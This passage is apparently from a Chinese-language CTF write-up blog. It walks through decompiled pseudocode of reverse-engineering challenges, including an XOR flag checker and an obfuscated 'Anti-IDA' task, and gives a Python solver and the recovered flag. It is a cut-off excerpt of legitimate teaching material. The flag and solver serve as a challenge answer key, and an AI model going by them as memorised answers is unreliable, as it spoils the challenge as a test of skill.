class="line">  v1 = *(<span class="hljs-keyword">char</span> **)a1;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( *(_QWORD *)(a1 + <span class="hljs-number">8</span>) != *(_QWORD *)a1 )</span><br><span class="line">  {</span><br><span class="line">    v2 = *v1;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *v1 == <span class="hljs-number">10</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_7:</span><br><span class="line">      v7 = (_QWORD *)__cxa_allocate_exception(<span class="hljs-number">8LL</span>);</span><br><span class="line">      *v7 = &amp;unk_202CD0;</span><br><span class="line">      __cxa_throw(v7, &amp;`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">'</span>std::exception, &amp;std::exception::~exception);</span><br><span class="line">    }</span><br><span class="line">    v3 = <span class="hljs-number">0LL</span>;</span><br><span class="line">    <span class="hljs-built_in">LOBYTE</span>(v4) = <span class="hljs-number">35</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      *v1 = v4 ^ v2;</span><br><span class="line">      v5 = (<span class="hljs-keyword">unsigned</span> __int8)v4 + v3++;</span><br><span class="line">      v4 = v5 + ((<span class="hljs-keyword">unsigned</span> __int64)(<span class="hljs-number">0x8080808080808081</span>LL * (<span class="hljs-keyword">unsigned</span> __int128)(<span class="hljs-keyword">unsigned</span> __int64)v5 &gt;&gt; <span class="hljs-number">64</span>) &gt;&gt; <span class="hljs-number">7</span>);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v3 &gt;= *(_QWORD *)(a1 + <span class="hljs-number">8</span>) - *(_QWORD *)a1 )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      v1 = (<span class="hljs-keyword">char</span> *)(v3 + *(_QWORD *)a1);</span><br><span class="line">      v2 = *v1;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *v1 == <span class="hljs-number">10</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_7;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>只是进行了简单的异或，只不过是一遍生成一边和输入异或，不过这些数据和输入无关，可以先算出来，至于<code>v4 = v5 + ((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v5 &gt;&gt; 64) &gt;&gt; 7);</code>这一步的计算，其实仔细看看就会发现根本没有意义</p><p>接下来进行判断</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_11C0</span><span class="hljs-params">(_BYTE **a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __m128i *v1; <span class="hljs-comment">// rbx</span></span><br><span class="line">  _BYTE *v2; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __m128i v3; <span class="hljs-comment">// xmm0</span></span><br><span class="line">  __m128i v4; <span class="hljs-comment">// xmm1</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 v5; <span class="hljs-comment">// rsi</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// ebp</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">Unwind_Exception</span> *<span class="hljs-title">v8</span>;</span> <span class="hljs-comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  v1 = (__m128i *)<span class="hljs-keyword">operator</span> <span class="hljs-built_in"><span class="hljs-keyword">new</span></span>(<span class="hljs-number">0xE8</span>uLL);</span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v1[<span class="hljs-number">1</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1A10);</span><br><span class="line">  v3 = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1A20);</span><br><span class="line">  v1[<span class="hljs-number">14</span>].m128i_i64[<span class="hljs-number">0</span>] = <span class="hljs-number">-2051389526429375416LL</span>;</span><br><span class="line">  v1[<span class="hljs-number">2</span>] = v3;</span><br><span class="line">  v1[<span class="hljs-number">3</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1A30);</span><br><span class="line">  v1[<span class="hljs-number">4</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1A40);</span><br><span class="line">  v1[<span class="hljs-number">5</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1A50);</span><br><span class="line">  v1[<span class="hljs-number">6</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1A60);</span><br><span class="line">  v1[<span class="hljs-number">7</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1A70);</span><br><span class="line">  v1[<span class="hljs-number">8</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1A80);</span><br><span class="line">  v1[<span class="hljs-number">9</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1A90);</span><br><span class="line">  v1[<span class="hljs-number">10</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1AA0);</span><br><span class="line">  v1[<span class="hljs-number">11</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1AB0);</span><br><span class="line">  v4 = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1A00);</span><br><span class="line">  v1[<span class="hljs-number">12</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1AC0);</span><br><span class="line">  *v1 = v4;</span><br><span class="line">  v1[<span class="hljs-number">13</span>] = _mm_load_si128((<span class="hljs-keyword">const</span> __m128i *)&amp;byte_1AD0);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( a1[<span class="hljs-number">1</span>] == v2 )</span><br><span class="line">  {</span><br><span class="line">    v5 = <span class="hljs-number">0LL</span>;</span><br><span class="line">LABEL_11:</span><br><span class="line">    v8 = (struct _Unwind_Exception *)std::__throw_out_of_range_fmt(</span><br><span class="line">                                       <span class="hljs-string">"vector::_M_range_check: __n (which is %zu) &gt;= this-&gt;size() (which is %zu)"</span>,</span><br><span class="line">                                       v5,</span><br><span class="line">                                       v5);</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v1)</span></span>;</span><br><span class="line">    _Unwind_Resume(v8);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( (_BYTE)byte_1A00 == *v2 )</span><br><span class="line">  {</span><br><span class="line">    v5 = <span class="hljs-number">1LL</span>;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v5 == a1[<span class="hljs-number">1</span>] - v2 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_11;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *((_BYTE *)v1-&gt;m128i_i64 + <span class="hljs-number">4</span> * v5) != v2[v5] )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_9;</span><br><span class="line">      ++v5;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v5 != <span class="hljs-number">58</span> );</span><br><span class="line">    v6 = <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">LABEL_9:</span><br><span class="line">    v6 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v1)</span></span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> v6;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>关键其实只有一个相等的判断，不过两个数组每次索引值增加的不一样，每四位进行一次比较就好了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">0x45</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x7D</span>,</span><br><span class="line">          <span class="hljs-number">0x39</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x79</span>,</span><br><span class="line">          <span class="hljs-number">0x22</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xF1</span>,</span><br><span class="line">          <span class="hljs-number">0x25</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xCB</span>,</span><br><span class="line">          <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xC3</span>,</span><br><span class="line">          <span class="hljs-number">0x71</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x2E</span>,</span><br><span class="line">          <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xD7</span>,</span><br><span class="line">          <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x9C</span>,</span><br><span class="line">          <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x8A</span>,</span><br><span class="line">          <span class="hljs-number">0x68</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x8F</span>,</span><br><span class="line">          <span class="hljs-number">0x31</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xF4</span>,</span><br><span class="line">          <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xF2</span>,</span><br><span class="line">          <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xE3</span>]</span><br><span class="line"></span><br><span class="line">v = [<span class="hljs-number">35</span>]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">58</span>):</span><br><span class="line">    v.append((v[i] + i) % <span class="hljs-number">0xff</span>)</span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">58</span>):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(target[i * <span class="hljs-number">4</span>] ^ v[i])</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>直接输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{<span class="hljs-number">7</span>here_i<span class="hljs-number">5</span>_no_d<span class="hljs-number">0</span>ubt_th<span class="hljs-number">47</span>_re_pr<span class="hljs-number">0</span>b<span class="hljs-number">1</span>em<span class="hljs-number">5</span>_<span class="hljs-number">4</span>re_e<span class="hljs-number">4</span>sy_<span class="hljs-number">7</span>o_s<span class="hljs-number">0</span>lve}</span><br></pre></td></tr></tbody></table></figure><hr><blockquote><p>下面是其他师傅的题目</p></blockquote><h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p>混淆了一下，函数的功能很简单，调试一下就出来了</p><h3 id="你好sao啊"><a href="#你好sao啊" class="headerlink" title="你好sao啊"></a>你好sao啊</h3><p>很显然换表base64，解一下就出来了</p><h3 id="Anti-IDA"><a href="#Anti-IDA" class="headerlink" title="Anti-IDA"></a>Anti-IDA</h3><p>出题人给hint说不要用IDA，但我在这之前已经用IDA做完了……</p><p>其实只需要调整一下堆栈平衡，patch一些花指令，这题并没有什么难度，但是这么些个逻辑运算真的恶心</p><p>首先从main函数走到了<code>sub_401E10</code>，所有的操作都在这里处理</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">length0 = <span class="hljs-built_in">strlen</span>(commandline_input);</span><br><span class="line">input0[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;</span><br><span class="line"><span class="hljs-built_in">memset</span>(&amp;input0[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0x3FC</span>u);</span><br><span class="line">v51 = <span class="hljs-number">0</span>;</span><br><span class="line">v52 = <span class="hljs-number">0</span>;</span><br><span class="line"><span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, input0);</span><br><span class="line">length1 = <span class="hljs-built_in">strlen</span>(input0);</span><br><span class="line">length_input = length1;</span><br></pre></td></tr></tbody></table></figure><p><code>commandline_input</code>可以不管它，先是输入了flag然后获取了长度，然后走第一个判断</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">input0[length_input] = <span class="hljs-number">10</span>;</span><br><span class="line">v48 = <span class="hljs-number">32</span>;</span><br><span class="line"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; length_input; ++i )</span><br><span class="line">  input0[i] -= v48;</span><br><span class="line">v45 = (<span class="hljs-keyword">unsigned</span> __int8)input0[<span class="hljs-number">2</span>] &gt; length_input;</span><br><span class="line">v44 = (<span class="hljs-keyword">unsigned</span> __int8)input0[<span class="hljs-number">1</span>] &gt; v48;</span><br><span class="line"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">alwaystrue12</span>(v44, v45) == <span class="hljs-number">1</span> )</span><br><span class="line">  <span class="hljs-built_in">sub_40105A</span>();                           <span class="hljs-comment">// 第一步</span></span><br><span class="line">v45 = (<span class="hljs-keyword">unsigned</span> __int8)input0[<span class="hljs-number">2</span>] &gt; length_input;</span><br><span class="line">v44 = (<span class="hljs-keyword">unsigned</span> __int8)input0[<span class="hljs-number">1</span>] &gt; v48;</span><br><span class="line"><span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">alwaystrue12</span>(v44, v45) )</span><br><span class="line">  <span class="hljs-built_in">sub_401064</span>();</span><br></pre></td></tr></tbody></table></figure><p>用到的判断是一个永真判断，所以默认执行第一个函数，初始化<code>target1</code>为奇数</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_401870</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+50h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">5</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    target1[i] = <span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>;</span><br><span class="line">    result = i + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>下面的几个逻辑判断发现也是永真，执行到这一步</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">alwaystrue1</span>(<span class="hljs-built_in">SLODWORD</span>(v46), <span class="hljs-built_in">SHIDWORD</span>(v46)) == <span class="hljs-number">1</span> )</span><br><span class="line">          <span class="hljs-built_in">deal_with_4321c0</span>();</span><br></pre></td></tr></tbody></table></figure><p>初始化了一个<code>tttt</code>的数组，然后又执行了一个函数</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*<span class="hljs-built_in">sub_401A10</span>())()</span><br><span class="line">{</span><br><span class="line">  tttt[<span class="hljs-number">0</span>] = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>;</span><br><span class="line">  dword_4321C4 = <span class="hljs-built_in">tri</span>(<span class="hljs-number">1</span>);</span><br><span class="line">  dword_4321C8 = <span class="hljs-number">1</span>;</span><br><span class="line">  dword_4321CC = <span class="hljs-built_in">tri</span>(<span class="hljs-number">1</span>);</span><br><span class="line">  dword_4321D0 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>) + <span class="hljs-number">2</span>;</span><br><span class="line">  dword_4321D4 = <span class="hljs-number">1</span>;</span><br><span class="line">  dword_4321D8 = <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> off_42EA3C[<span class="hljs-number">0</span>];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>但是这里的处理显然是假的，后面返回的函数又对这个数组进行了重新的赋值，真正的赋值部分在下面</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">sub_4015F0</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">void</span> *retaddr; <span class="hljs-comment">// [esp+0h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  tttt[<span class="hljs-number">0</span>] = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);</span><br><span class="line">  dword_4321C4 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>;</span><br><span class="line">  dword_4321C8 = <span class="hljs-number">2</span>;</span><br><span class="line">  dword_4321CC = <span class="hljs-built_in">tri</span>(<span class="hljs-number">1</span>);</span><br><span class="line">  dword_4321D0 = <span class="hljs-number">1</span>;</span><br><span class="line">  dword_4321D4 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);</span><br><span class="line">  dword_4321D8 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> retaddr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后又是一个永真的判断</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="hljs-built_in">sqrt</span>(v46);</span><br><span class="line">      v2 = _ftol(v1);</span><br><span class="line">      v3 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">5</span>, v2) - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !(v3 % <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)) )                <span class="hljs-comment">// 第三步</span></span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; length_input; ++i )</span><br><span class="line">          input0[i] += input0[i + <span class="hljs-number">1</span>];</span><br><span class="line">        <span class="hljs-keyword">for</span> ( i = length_input - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; --i )</span><br><span class="line">          input0[i] += *((_BYTE *)&amp;length_input + i + <span class="hljs-number">3</span>);</span><br><span class="line">        <span class="hljs-keyword">for</span> ( i = length_input - 